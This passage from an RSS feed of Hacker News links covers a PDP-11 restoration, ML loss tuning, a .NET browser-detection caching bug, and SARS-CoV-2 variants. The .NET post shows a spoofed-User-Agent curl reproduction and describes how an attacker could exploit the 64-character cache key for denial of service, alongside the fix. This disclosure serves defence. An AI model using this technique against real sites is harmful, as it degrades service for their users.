src="http://i.imgur.com/soZUSxo.png"></a></p><br>However it ends up spinning waiting for TX ready bit of the console serial port to become ready. Strange. Maybe the M7800 is faulty?</span></p><p><span face="verdana, sans-serif"><b>Another M7800</b><br></span></p><p><span face="verdana, sans-serif"><br>Another M7800 was configured a put into the back plane. A serial port was connected to the my laptop.<p><a href="http://i.imgur.com/0OiZWz0l.png" imageanchor="1"><img src="http://i.imgur.com/0OiZWz0l.png"></a></p></span></p></div><p><span face="verdana, sans-serif">Perfect! Now it passed diagnostics step 1 to 4. But pressing DL to make it boot from the (non existent) RL device causes it to halt. <br></span></p><p><span face="verdana, sans-serif">It seems that when trying to execute the memory tests it fails and then it gets a double bus fault when handling the first. This very well matches the TRAP handling of the CPU.<br></span></p><div><p><span><span face="verdana, sans-serif">Failing DIP switch!</span></span></p><p><span face="verdana, sans-serif">While investigating the memory board and checking the jumpers and switch settings I found that although I changed the DIP switches back and forth regardless of position 6 out of 8 of the switches remained open circuit. Not very promising<span>.<br></span></span></p><p><span face="verdana, sans-serif"><p><a href="http://i.imgur.com/QdUYcEjl.png" imageanchor="1"><img alt="DIP switches" src="http://i.imgur.com/QdUYcEjl.png"></a></p><p>New switch to the left and old to the right.</p><p>Finally it runs!</p><p><a href="http://i.imgur.com/CwHpbFnl.png" imageanchor="1"><img alt="Memory OK!" src="http://i.imgur.com/CwHpbFnl.png"></a></p></span></p><div><p><span face="verdana, sans-serif">It is possible Examine and Deposit in the memory!</span></p><p><span face="verdana, sans-serif"><span>PDP11GUI</span></span></p><p><span face="verdana, sans-serif"><a href="http://retrocmp.com/tools/pdp11gui">PDP11GUI</a>&nbsp;is a nice windows tool to control your PDP-11. It can be used to load files into memory, examining memory and starting the CPU to run. <p><span><img alt="Zooma in (verklig storlek: 1279 x 775)" src="http://elektronikforumet.com/forum/images/spacer.gif" title="Zooma in (verklig storlek: 1279 x 775)"></span></p><p><a href="http://i.imgur.com/4UYRAjsl.png" imageanchor="1"><img alt="PDP11GUI" src="http://i.imgur.com/4UYRAjsl.png"></a></p><br></span></p><p><span face="verdana, sans-serif" size="2">There are papertapes of&nbsp;<a href="http://iamvirtual.ca/PDP-11/Basic-11/DEC-11-AJPB-PB.ptap">BASIC</a>&nbsp;to be found on many places on the internet. But it comes in an Absolute Binary Loader format which&nbsp;<a href="http://retrocmp.com/tools/pdp11gui">PDP11GUI</a>&nbsp;currently cannot read. However writing a small C program to convert it is simple and then it can be fee into the machine, but it is not very fast to run over a 9600 bps serial line.</span></p><p><span face="verdana, sans-serif" size="2">The Absolute Loader is a small paper tape that need to be bootstrapped into memory for the machine to be able to load files in Absolute Loader format, like to BASIC interpreter above. The Absolute loader comes on a tape called&nbsp;<span>DEC-11-L2PC-PO.</span></span></p><div><p><span face="verdana, sans-serif"><b>UPDATE</b>: As of v1.38 of&nbsp;<a href="http://retrocmp.com/tools/pdp11gui">PDP11GUI</a>&nbsp;it is not necessary to convert the file before using it with&nbsp;<a href="http://retrocmp.com/tools/pdp11gui">PDP11GUI</a>&nbsp;since this conversion has been included in&nbsp;<a href="http://retrocmp.com/tools/pdp11gui">PDP11GUI</a>.<br></span></p></div><p><span face="verdana, sans-serif">Starting the PDP at 016104 gives the BASIC prompt!<br></span></p>
</div><p><span face="verdana, sans-serif">It seems that I haven't been around doing any BASIC programming for a long long time :-)</span></p>
<p><b><span face="verdana, sans-serif">Running diagnostics</span></b></p></div><p><span face="verdana, sans-serif">To really check that the CPU was working as it should there are two diagnostics to run. These are GKAA and GKAB. There are actually two ways to run them. Either you have an image of the paper tape which you load by PDP11GUI or you run the XXDP environment. I tried both ways.&nbsp;</span></p><p><span face="verdana, sans-serif">Originally these are paper tape software but unfortunately I was unable to find images of these paper tapes. But I did find a XXDP image with the GKAAA0.BIC and GKABC0.BIC on them. It turns out that these binaries in reality has exactly the same format as a paper tape. I used the <a href="http://www.dbit.com/putr/">PUTR</a>&nbsp;tool to extract them from the image. Please make sure to copy them as binary otherwise you end up like me scratching my head for hours... I then used PDP11GUI to load them into memory and starting them at address 200.&nbsp;</span></p><p><b><span face="verdana, sans-serif">Booting XXDP</span></b></p><p><span face="verdana, sans-serif">XXDP needs to be booted from some kind of mass storage. The only thing than would be quite easy to get running on the machine right now is TU58 since it is using a standard serial port to connect to the drive. The drive itself can be emulated using a PC or MAC. I downloaded&nbsp;<a href="http://www.ak6dn.com/PDP-11/TU58/tu58em/index.html">tu58em</a>&nbsp;and compiled it on my Mac. It needed just a few modifications to the serial port code to compile cleanly.</span></p><p><span face="verdana, sans-serif">Then I started the work to get a bootable TU58 image for my TU58 emulator. It is far simpler to use an emulator to all this kind of work. I used&nbsp;<a href="http://www.dbit.com/">E11</a>&nbsp;to do all this. First I tried XXDP 2.6 which I found an image for on bitsavers:</span></p><p><span face="verdana, sans-serif">Unfortunately it required more memory than my machine had so it won't be possible to run this version. Besides the GKAB diagnostics doesn't run at all on the emulated PDP-11/04 for some reason!</span></p><p><span face="verdana, sans-serif">I then spent some time to make a TU58 image for XXDP+, an earlier version of the XXDP suite.</span></p><p><span face="verdana, sans-serif">This is how I did that using E11:</span></p><p><span face="verdana, sans-serif">Running GKAAA0.BIC under XXDP+ on the real machine works fine. Most of the machine is in perfect order! Here is a link to the <a href="http://storage.datormuseum.se/u/96935524/Datormusuem/dddp2.dsk">image</a> I used.</span></p><div><p><span face="verdana, sans-serif"><p><a href="http://storage.datormuseum.se/u/96935524/Datormusuem/Screenshot%20XXDP%20boot.png" imageanchor="1"><img src="http://storage.datormuseum.se/u/96935524/Datormusuem/Screenshot%20XXDP%20boot.png"></a></p><br></span></p></div><p><span face="verdana, sans-serif">But running the GKABC0 unfortunately ends with a halt. It is impossible to find a listing for this diagnostic but the PDP-11/34 version is very similar. Looking through the <a href="http://bitsavers.informatik.uni-stuttgart.de/pdf/dec/pdp11/xxdp/diag_listings/1134/AC-8045D-MC_CFKABD0-1134-Traps-Tst_Apr77.pdf">code</a>&nbsp;gives that the section where it halts is testing the stack overflow logic in the CPU. It does this by setting the stack pointer to 400 and then enable console TX interrupts. This will cause an immediate TX interrupt to occur. This will decrement the stack pointer below 400 and immediately trigger a trap to vector 4/6. My machine on the other hand will trigger new console interrupts until the stack wraps to 177774 (where there are no memory) and then halt with a double bus fault!</span></p><p><b><span face="verdana, sans-serif">Faulty DL11-W!</span></b></p><p><span face="verdana, sans-serif">By swapping cards I found that the using a replacement DL11-W the problem vanished. It seems that the interrupt logic inside the DL11-W has broken down. The interrupt shall be cleared as soon as the CPU responds with an SSYN. This doesn't happen on the faulty board. As soon as the CPU has started serving the interrupt till interrupt again and again.</span></p><p><span face="verdana, sans-serif">This is the unibus interrupt cycle. The device asserts /BRn line and the CPU responds with a BGn when the CPU is ready to serve the interrupt. The device will then respond with the /SACK and then put the vector on to the bus and assert the /INTR signal. The CPU will respond with a …</span></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.datormuseum.se/computers/digital-equipment-corporation/pdp-11-04">http://www.datormuseum.se/computers/digital-equipment-corporation/pdp-11-04</a></em></p>]]>
            </description>
            <link>http://www.datormuseum.se/computers/digital-equipment-corporation/pdp-11-04</link>
            <guid isPermaLink="false">hacker-news-small-sites-25974507</guid>
            <pubDate>Sun, 31 Jan 2021 00:33:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gamestop Insider Trading Data]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25974342">thread link</a>) | @jackhalford
<br/>
January 30, 2021 | http://openinsider.com/GME | <a href="https://web.archive.org/web/*/http://openinsider.com/GME">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://openinsider.com/GME</link>
            <guid isPermaLink="false">hacker-news-small-sites-25974342</guid>
            <pubDate>Sun, 31 Jan 2021 00:05:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why are machine learning algorithms hard to tune?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25974311">thread link</a>) | @giorgiop
<br/>
January 30, 2021 | https://engraved.ghost.io/why-machine-learning-algorithms-are-hard-to-tune/ | <a href="https://web.archive.org/web/*/https://engraved.ghost.io/why-machine-learning-algorithms-are-hard-to-tune/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                                <div>
                                    <section>
                                        <p>11 min read</p>
                                        <div><h2 id="why-are-machine-learning-algorithms-hard-to-tune">Why are machine learning algorithms hard to tune?</h2><p>In machine learning, linear combinations of losses are all over the place. In fact, they are commonly used as the standard approach, despite that they are a perilous area full of dicey pitfalls. Especially regarding how these linear combinations make your algorithm hard to tune.</p><p>Therefore, in this post we hope to lay out the following arguments:</p><ul><li>A lot of problems in machine learning should be treated as multi-objective problems, while they currently are not.</li><li>This lack of multi-objective treatment leads to difficulties in tuning the hyper-parameters for these machine learning algorithms.</li><li>It is nigh on impossible to detect when these problems are occurring, making it tricky to work around them.</li><li>There are methods to solve this which might be slightly involved, but do not require more than a few lines of code. <a href="https://engraved.ghost.io/how-we-can-make-machine-learning-algorithms-tunable">One of these methods is laid out in a follow-up blog post.</a></li></ul><p>Nothing of this article is novel. You might already be aware of everything we wanted to say. However, we have the impression that most machine learning curricula do not discuss optimisation methods very well (I know mine did not), and consequently, gradient descent is being treated as the one method to solve all problems. And the general message is that if an algorithm does not work for your problem, you need to spend more time tuning the hyper-parameters to your problem. </p><p><a href="https://engraved.ghost.io/how-we-can-make-machine-learning-algorithms-tunable">In the next blog post, a solution is introduced</a>, based on the NIPS’88 paper which introduced the Modified Differential Method of Multipliers.</p><p>So we hope that this blogpost can remove some confusion on how to handle this issue in a more foundational and principled way. And hey, maybe it can make you spend less time tuning your algorithms, and more time making research progress.</p><h2 id="linear-combinations-of-losses-are-everywhere">Linear combinations of losses are everywhere</h2><p>While there are single-objective problems, it is common for these objectives to be given additional regularisation. We have picked a selection of such optimisation objectives from across the field of machine learning field.</p><p>First off, we have the regularisers, weight decay and lasso. It is obvious that when you add these regularisations, you effectively have created a multi-objective loss for your problem. After all, what you really care about, is that both the original loss \(L_0\) and the regulariser loss are kept low. And you will tune the balance between the two using a \(\lambda\) parameter.</p><p>$$ L(\theta) = L_0(\theta) + \lambda \sum \left| \theta \right| $$</p><p>$$ L(\theta) = L_0(\theta) + \lambda \sum \theta^2 $$</p><p>As a consequence, losses found in e.g. VAE’s are effectively multi-objective, with a first objective to maximally cover the data, and a second objective to stay close to the prior distribution. In this case, occasionally KL annealing is used to introduce a tunable parameter \(\beta\) to help handle the multi-objectiveness of this loss.</p><p>$$ L(\theta) =\mathbb{E}_{q_{\phi}(z | x )} \left[ \log p_\theta ( x | z) \right] &nbsp;- \beta D_{KL} \left( q_\phi ( z | x) \| p(z) \right) $$</p><p>Also in reinforcement learning, you can see this multi-objectiveness. Not only is it common for many environments to simply sum rewards received for obtaining partial goals. The policy loss is usually also a linear combination of losses. Take as an example here the losses on the policy for PPO, SAC and MPO, entropy regularized methods with their tunable parameter <strong><em>α</em></strong>.</p><p>$$ L(\pi) = - \sum_t \mathbb{E}_{(s_t, a_t)} \left[ r(s_t, a_t) + \alpha \mathcal{H}(\cdot , s_t)\right]$$</p><p>$$ L(\pi) = - \sum_t \mathbb{E}_{(s_t, a_t)} \left[ \mathbb{E}_\pi\left(Q(s_t, a_t)\right) - \alpha D_{KL} \left( q \| \pi \right) \right]$$</p><p>Finally, the GAN-loss is of course a sum between the discriminator and the generator loss:</p><p>$$ L(\theta) = - \mathbb{E}_x \left[ \log D_\theta(x)\right] - \mathbb{E}_z \left[ \log ( 1- D_\theta(G_\theta(z))\right]$$</p><p>All of these losses have something in common, they are effectively trying to optimise for multiple objectives simultaneously, and argue that the optimum is found in balancing these often contradicting forces. In some cases, the sum is more ad hoc and a hyper-parameter is introduced to weigh the parts against each other. In some cases, there are clear theoretical foundations on why the losses are combined this way, and no hyper-parameter is used for tuning the balance between the parts. </p><blockquote>In this post, we hope to show you this approach of combining losses may sound appealing, but that this linear combination is actually precarious and treacherous. The balancing act is often more like a tightrope walk.</blockquote><p>Let us consider a simple case, where we are trying to optimise for such a linear combination of losses. We take the approach of optimising the total loss, which is a sum of losses. We optimise this with gradient descent, and we observe the following behaviour.</p><figure><img src="https://lh5.googleusercontent.com/953U2daXgDAO_97ugiYVEKnbK69gZVKUmlY9hNpCqtYlTso-XFw8WQ-dWRcBNeNtx7KNvXi1bM5mB8cfmnjXUMg4gU6fp5LvADys1WtoWIW-mqiJt1Uzu-Lw8VceNfQeLLQa9IZa" alt=""></figure><p>Our code in Jax would look something like this:</p><pre><code>def loss(θ):
  return loss_1(θ) + loss_2(θ)
loss_derivative = grad(loss)
for gradient_step in range(200):
  gradient = loss_derivative(θ)
  θ = θ - 0.02 * gradient</code></pre><p>As is usually the case, we are not immediately happy about the tradeoff between the two losses. So we introduce a scaling coefficient <strong><em>α</em></strong> on the second loss and run the following code:</p><pre><code>def loss(θ, α):
  return loss_1(θ) + α*loss_2(θ)
loss_derivative = grad(loss)
for gradient_step in range(200):
  gradient = loss_derivative(θ, α=0.5)
  θ = θ - 0.02 * gradient
</code></pre><p>The behaviour we hope to see is that when tuning this <strong><em>α</em></strong>, we can choose the trade-off between the two losses and select the point we are most happy with for our application. We effectively will go on a hyper-parameter tuning loop, manually select an <strong><em>α</em></strong>, run the optimisation process, decide we would like the second loss to be lower, tune our <strong><em>α</em></strong> up accordingly and repeat the whole optimisation process. After several iterations, we settle for the solution we found and continue writing our papers.</p><p>However, that is not what is always happening. The actual behaviour we sometimes observe for our problem looks like the one below.</p><figure><img src="https://lh6.googleusercontent.com/iZlk4MRVx7JYgLbaqIv-jH8zZGSc78Jj-aqk_YWy5e80tf_hgMMaBn41yRFR2rpRFGE8vuRGWjljGZ6Ri8XbyDhZbAQbSCX-putykGEpxgmcuPTmrQH1VHKpaKfjra3AG4u-x9K7" alt=""></figure><blockquote>It seems that no matter how we finetune our <strong><em>α</em></strong>-parameter, we cannot make a good trade-off between our two losses. </blockquote><p>We see two clusters of solutions, one where the first loss is ignored, and one where the second loss is ignored. However, both of these solutions are not useful for most applications. Most of the time, a point where the two losses were more balanced is a more preferred solution.</p><p>In fact, this diagram of the two losses over the course of training is barely ever plotted, so the dynamics illustrated in this figure often goes unobserved. We just look at the training curve plotting the total loss, and we might conclude that this hyper-parameter needs more time tuning, as it seems to be really sensitive. Alternatively, we could settle for an approach of early stopping to make the numbers in the paper work. After all, reviewers love data efficiency.</p><p>Where did it go wrong though? <strong>Why does this method sometimes work, and why does it sometimes fail to give you a tunable parameter?</strong> For that, we need to look deeper into the difference between the two figures.</p><p>Both figures are generated for the same problem, using the same losses and are optimising these losses using the same optimisation method. So none of these aspects are to blame for the difference. The thing which has changed between these problems is the model. In other words, the effect the model parameters <strong><em>θ</em></strong> have on the output of the model is different.</p><p>Therefore, let us <em>cheat</em> and visualise something which is normally not visualisable, the Pareto front for both of our optimisations. This is the set of all solutions achievable by our model, which are not dominated by any other solution. In other words, it is the set of achievable losses, where there is no point where <em>all</em> of the losses are better. No matter how you choose to trade off between the two losses, your preferred solution always lies on the Pareto front. By tuning the hyper-parameter of your loss, you usually hope to merely find a different point on that same front.</p><figure><img src="https://lh6.googleusercontent.com/6qA_NcRMUK8mWT3j3-t_bPl-oZkwg5Q9lWcOgBn9IB3qF_yQ7p1dyH6eq_DtKpTGeACMsLE-YfiIY9DH3yhF7swsmMFGMjNwI_oHdKKbNTuO0M8a_oDZQTUhKGcEuAfTpomqHX-M" alt=""></figure><figure><img src="https://lh6.googleusercontent.com/kVqsudO8-j48MEsdlaZgDgc22jMO9myzwdbTTWQ-KufWjuXqIr9gNHKrgV-fRzTb5gMgDnO-sFp1z_lS3UhX3wjwXHRowiaO7Vp04ZaYEAthw7y6wyN3zltH3o0wgB5ZbTDjRuRb" alt=""></figure><p>The difference between the two Pareto fronts is what is causing the tuning to turn out well for the first case, but to fail horribly after changing our model. It turns out that when the Pareto front is convex, we can achieve all possible trade-offs by tuning our <strong><em>α</em></strong>-parameter. However, when the Pareto front is concave, that approach does not seem to work well anymore.</p><h2 id="why-does-gradient-descent-optimisation-fail-for-concave-pareto-fronts">Why does gradient descent optimisation fail for concave Pareto fronts?</h2><p>We can illustrate why that is the case, by looking at the total loss in the third dimension, the loss which is actually optimised with gradient descent. In the following figure, we visualise the plane of total loss in relation to each of the losses. While we actually descend on this plane using the gradient with respect to the parameters, each gradient descent step we take will also necessarily go downwards on this plane. You can imagine the gradient descent optimisation process as putting a spherical pebble on that plane, letting it wobble down under gravity and wait until it comes to a halt.</p><p>The point where the optimisation process halts is the result of the optimisation process, here indicated by a star. As you can see in the following figure, no matter how you wobble down the plane, you will always end up in the optimum.</p><figure><img src="https://lh4.googleusercontent.com/U43_rJCiufKMSZ4gtci5kTQ2DRIH_r8WyvFi0aFV0wjpxXTNSFnMzR8a9DHvBc_ONbi0rEIBfXRQXUSxAcriZDGBNWVRhMQ-ifaIXdgeNf1K6cEIeXzMjYZUk94EWMH_bOBzvhOa" alt=""></figure><p>By tuning <strong><em>α</em></strong>, this space stays a plane. After all, by changing <strong><em>α</em></strong>, we are only changing the tilt of this plane. As you can see, &nbsp;in the convex case any solution on the Pareto curve can be achieved by tuning <strong><em>α</em></strong>. A little more <strong><em>α</em></strong> pulls the star to the left, a little less <strong><em>α</em></strong> pushes the star to the right. Every starting point of the optimisation process will converge on the same solution, and that is true for all values of <strong><em>α</em></strong>.</p><figure><img src="https://engraved.ghost.io/content/images/2021/01/visualising_the_convex_case.mp4.hq.gif" alt=""></figure><p>However, if we take a look at the differently modeled problem with a concave Pareto front, it becomes apparent where …</p></div></section></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://engraved.ghost.io/why-machine-learning-algorithms-are-hard-to-tune/">https://engraved.ghost.io/why-machine-learning-algorithms-are-hard-to-tune/</a></em></p>]]>
            </description>
            <link>https://engraved.ghost.io/why-machine-learning-algorithms-are-hard-to-tune/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25974311</guid>
            <pubDate>Sun, 31 Jan 2021 00:00:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[.NET's defective browser detection causing DoS]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25974214">thread link</a>) | @fegu
<br/>
January 30, 2021 | https://gundersen.net/nets-defective-cached-browser-capabilities-detection-dos-attack/ | <a href="https://web.archive.org/web/*/https://gundersen.net/nets-defective-cached-browser-capabilities-detection-dos-attack/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								
<p>Ever since .Net v4, in all versions including the last classic .Net version v4.8, the built-in browser detection accessible in the Request.Browser (a HttpBrowserCapabilities object) has a serious flaw which will bite you as soon as your site gets several visitors per minute.</p>



<p>What happens, if you rely on this object, is that users will randomly report having their browser mis-identified.</p>



<p>This post shows why it happens and how to solve it. The issue is also easy to reproduce locally, worth a few fun minutes. If you are so inclined, the problem also lends itself to a DoS attack.</p>



<p>Even though this problem seems only to affect classic .Net (not .Net Core), there is a huge number of running web apps out there, and still new being developed, on this framework.</p>



<p>We have a website relying on some of the later browser features, so we are using browser detection to tell users with older browsers to upgrade, since we absolutely need these features. It works fine for a while, then randomly, users with recent browser versions are suddenly told they need to upgrade. Once this occures it typically lasts for the rest of the day.</p>



<p>To reproduce, create an asp.net project (web forms, MVC, doesn’t really matter) with this code in a .aspx file:</p>



<pre><code>&lt;script language="c#" runat="server"&gt;
public void Page_Load(){
    Response.Write(Request.Browser.Browser 
    + " v" + Request.Browser.MajorVersion);
}
&lt;/script&gt;
</code></pre>



<p>Visit this page, locally or on a server, and you get for instance <code>Chrome v88</code>. So far, so good.</p>



<p>The browser is classified from the User-Agent HTTP header. My Chrome sends this: <code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36</code></p>



<p>Now, quickly change the <code>Chrome/88</code> in the middle of the string to <code>Chrome/86</code> (or any other number) and retry. For instance in Curl:</p>



<pre><code>curl http://localhost:58571 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4324.104 Safari/537.36"</code></pre>



<p>Still v88? How strange… Let’s refresh a few times. Still v88. Let’s think for a minute…hmm…refresh again. Gone! Now, at last, it shows v86! </p>



<p>I had to look into the <a href="https://referencesource.microsoft.com/System.Web/Configuration/HttpCapabilitiesEvaluator.cs.html#https://referencesource.microsoft.com/System.Web/Configuration/HttpCapabilitiesEvaluator.cs.html,3774a0750f8cc853,references">offending source code</a> from the .Net framework.</p>



<p>What happens is, for performance, the result of the browser classification is stored in a hash-table with the User-Agent string as the key. But not the entire string, no, that would have saved us a lot of headache, no, the key is just the first 64 characters (source line 46).</p>



<p>The Chrome version number is located at position 90 and thus not part of the key at all. To add to the frustration, the cache has a sliding-window (source line 247,304, 369) 1 minute expiry (source line 147). This means: as long as the cache key is read at least once a minute, it stays. Hilarity ensues.</p>



<p>The fix is straight-forward, put this in your <code>web.config</code></p>



<pre><code>&lt;configuration&gt;
    &lt;system.web&gt;
        &lt;browserCaps userAgentCacheKeyLength="512" /&gt;
    &lt;/system.web&gt;
&lt;/configuration&gt;</code></pre>



<p>Why 512? It turns out that .Net caps the User-Agent string at 512 characters  to avoid resource attacks (source line 188). I imagine someone at Microsoft deciding that 512 characters ought to be enough for anybody.</p>



<h2>Denial-of-Service implication</h2>



<p>Without this line in your web.config, your site is also vulnerable to a DoS attack if you, like us, rely on browser identification to enable some functionality. An attacker would wait for low-traffic hours, typically the middle of the night, to issue requests with the first 64 bytes looking like the most commonly used User-Agents on the web, but the rest of the string tweaked with low version numbers or other content to lead the browser capabilities to think “it’s an older browser, sir, but it checks out”.</p>



<p>As long as one request per User Agent is issued per minute, these are permanently mis-identified. An exceptionally low-cost and low-effort DoS attack.</p>




											</div></div>]]>
            </description>
            <link>https://gundersen.net/nets-defective-cached-browser-capabilities-detection-dos-attack/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25974214</guid>
            <pubDate>Sat, 30 Jan 2021 23:43:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I've been banned again on Facebook, but you won't believe why]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25974190">thread link</a>) | @blisseyGo
<br/>
January 30, 2021 | https://odysee.com/@YoungRippa59:a/i-ve-been-banned-again-but-you-won-t:4 | <a href="https://web.archive.org/web/*/https://odysee.com/@YoungRippa59:a/i-ve-been-banned-again-but-you-won-t:4">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://odysee.com/@YoungRippa59:a/i-ve-been-banned-again-but-you-won-t:4</link>
            <guid isPermaLink="false">hacker-news-small-sites-25974190</guid>
            <pubDate>Sat, 30 Jan 2021 23:38:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SARS-CoV-2 variants of concern]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25973815">thread link</a>) | @dlx
<br/>
January 30, 2021 | https://www.virology.ws/2021/01/28/sars-cov-2-variants-of-concern/ | <a href="https://web.archive.org/web/*/https://www.virology.ws/2021/01/28/sars-cov-2-variants-of-concern/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><main id="genesis-content"><article aria-label="SARS-CoV-2 variants of concern" itemscope="" itemtype="https://schema.org/CreativeWork"><div itemprop="text">
<div><figure><img loading="lazy" width="140" height="300" src="https://www.virology.ws/wp-content/uploads/2021/01/CoV-2-spike-colored-140x300.png" alt="" srcset="https://www.virology.ws/wp-content/uploads/2021/01/CoV-2-spike-colored-140x300.png 140w, https://www.virology.ws/wp-content/uploads/2021/01/CoV-2-spike-colored-478x1024.png 478w, https://www.virology.ws/wp-content/uploads/2021/01/CoV-2-spike-colored.png 666w" sizes="(max-width: 140px) 100vw, 140px"></figure></div>



<p>In recent months variants of SARS-CoV-2 have been detected that are unusual in that they have many more genome mutations than previously found. These have been called ‘variants of concern’ (VOC) as it has been suggested that the genome mutations might impact transmission, immune control, and virulence. Below I cover each of these issues separately.</p>



<p><strong>Transmission</strong></p>



<p>The SARS-CoV-2 lineage called B.1.1.7 arose in the United Kingdom in September 2020 and harbors 17 genomic mutations, some of which lead to amino acid changes in the spike protein (pictured). Similar but distinct variants have been detected in other locations, including South Africa (B.1.135) and Brazil, but the B.1.1.7 lineage has been best studied. A good summary of the changes can be found <a href="https://www.biorxiv.org/content/10.1101/2021.01.25.427948v1">in this manuscript</a>. A number of lines of evidence have led to the conclusion that viruses of the B.1.1.7 lineage may have increased transmissibility compared with previous isolates. These include the rapid displacement of previous variants in the UK within a short period of time; an apparent increase in the R index for such variants; and increased levels of viral RNA in nasopharyngeal washes as measured by PCR or RNA sequencing.</p>



<p>The virological definition of transmission is the movement of viruses from one host to another. In the case of SARS-CoV-2, such transmission occurs when infectious virus particles are exhaled within respiratory droplets and arrive in another host, where they initiate infection. The evidence cited above for increased transmission of the B.1.1.7 lineage are all indirect and do not prove that the variants actually transmit, in a virological sense, better between hosts. The population growth of the variant could, for example, be a consequence of changes in human behavior. The R index, a measure of transmisssibility, is influenced not only by the virus but by human behavior. The finding of increased levels of RNA in nasopharyngeal wash is also inconclusive with respect to transmission. Viral RNA is not the same as infectious virus, and no studies have been done measuring shedding of infectious virus from individuals infected with variants of the B.1.1.7 lineage compared with other variants.</p>



<p>There is no doubt that the B.1.1.7 lineage has rapidly displaced others in the UK. Whether this behavior is due to an increased ability of the virus to be transmitted form one host to another has not been demonstrated. The variant has also been detected in other countries and its dispersion in those locations are not consistent with increased transmission (as I have defined above). For example, we now know that the&nbsp;B.1.1.7 lineage <a href="https://virological.org/t/phylogenetic-evidence-that-b-1-1-7-has-been-circulating-in-the-united-states-since-early-to-mid-november/598">was present in the US</a>&nbsp;5-6 weeks before its detection in the UK, yet as of January it comprised just 0.3% of cases nationally. After 2 months of circulation in California, the lineage is estimated to account for 0.4% of cases compared with 1.2% at a similar point in the UK. In Florida the lineage is associated with higher spread, 0.7% of cases, but this is not the situation in other US states.</p>



<p>These data emphasize that we cannot conclude that the B.1.1.7 lineage is biologically more transmissible. Multiple factors are likely at play, and this is why it is better to view the B.1.1.7 lineage variants and others in terms of their fitness – the reproductive success of the virus. Many factors can influence fitness, not just transmission. These could include increased physical stability of the particle, increased resistance to immune responses, longer duration of virus presence in the nasopharynx, increased infectious virus produced within the host, more efficient establishment of infection in a host, and more. A slight increase in any of these might drive a particular variant within a population but not actually affect person to person transmission. Whether such mutations are spread by founder effect – being in the right place at the right time – also must be taken into consideration.</p>



<p>The statistical models that have been used to approximate the transmission of SARS-CoV-2 variants cannot prove a biological property because drive through a population can be a consequence of various fitness parameters. Experiments either in animal models (in which case the relevance to humans is unknown) or measurement of infectious virus in humans is needed. So far none of the latter have been done for the current variants.</p>



<p><strong>Immune control</strong></p>



<p>A more immediate concern is whether any of the changes in spike protein within VOC impact the ability of immune response to control infections. This question has been directly addressed for neutralizing antibodies, e.g. those which can block infection. Antibodies recognize specific protein sequences on the virus particle, and specifically the spike protein for those given the mRNA vaccine. Some of the spike changes identified in variants are in regions known to bind antibodies. Consequently an important question is whether vaccination can inhibit infection with the variant viruses.</p>



<p>This question has been addressed for both the Moderna and the Pfizer mRNA vaccines.&nbsp;<a href="https://www.biorxiv.org/content/10.1101/2021.01.25.427948v1">Sera from persons immunized with mRNA-1273</a>&nbsp;efficiently neutralized pseudotyped viruses bearing the SARS-CoV-2 spike glycoprotein from the B.1.1.7 lineage. These sera had a reduced (6.4 fold) neutralization titer when the South African B.1.351 lineage was used. However these sera still fully neutralized B.1.351 with a titer of 1:290 which may be sufficient to prevent severe COVID-19. Nevertheless,&nbsp;<a href="https://investors.modernatx.com/news-releases/news-release-details/moderna-covid-19-vaccine-retains-neutralizing-activity-against">Moderna has announced</a>&nbsp;that it will advance a modified vaccine (mRNA-1273.351) encoding the B.1.351 amino acid changes.</p>



<p><a href="https://www.biorxiv.org/content/10.1101/2021.01.27.427998v1">In a separate study</a>, sera from individuals vaccinated with the Pfizer BNT162b2 mRNA vaccine was tested in neutralization assays using SARS-CoV-2 viruses with selected spike amino acid changes from the B.1.1.7 (deletion of amino acids 69/70, N501Y, D614G) or B.1.351 (E484K + N501Y + D614G) lineages. These changes had small effects on neutralization with the sera. However, the engineered viruses do not contain the full set of changes found in the B.1.1.7 and B.1.351 viruses, which might explain the different results compared sera with antibodies induced by mRNA-1273.</p>



<p>These observations provide confidence that the two mRNA vaccines will provide protection against COVID-19 caused by currently circulating variants. However genomic surveillance must be increased to ensure that any new spike changes that might arise are detected quickly and their effects on neutralization determined.</p>



<p><strong>Disease severity</strong></p>



